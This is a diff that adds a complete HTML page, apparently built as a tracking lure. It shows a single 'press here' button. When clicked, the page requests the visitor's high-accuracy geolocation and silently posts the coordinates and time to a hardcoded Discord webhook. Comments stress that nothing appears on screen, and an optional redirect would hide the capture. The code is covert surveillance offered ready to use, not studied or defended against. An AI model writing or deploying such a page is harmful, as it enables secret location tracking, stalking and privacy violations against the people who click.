@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cukusxan site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- The user sees a generic button. Nothing prints on screen after clicking -->
+    <button id="action-btn">bura bas</button>
+
+    <script>
+        // PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1534114121019035749/odk0yT1rsnHtzg-PZpfT01ZTRbqIEhvSLL3wiOJeVvqdVACfBkiQAimgh8yDg5_tvbFT";
+
+        document.getElementById('action-btn').addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000
+                });
+            } else {
+                console.log("Not supported");
+            }
+        });
+
+        function sendToDiscord(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const time = new Date(position.timestamp).toLocaleString();
+
+            // Prepare the payload for Discord
+            const data = {
+                content: `📍 **cukusxan**\n• labubu: ${lat}\n• pox: ${lon}\n• Time: ${time}`
+            };
+
+            // Send the data silently in the background
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Optional: Redirect the user somewhere else after sending
+                // window.location.href = "https://google.com";
+            })
+            .catch(err => console.error("Error sending:", err));
+        }
+
+        function handleError(error) {
+            console.log("shutup beta.");
+        }
+    </script>
+
+</body>
+</html>
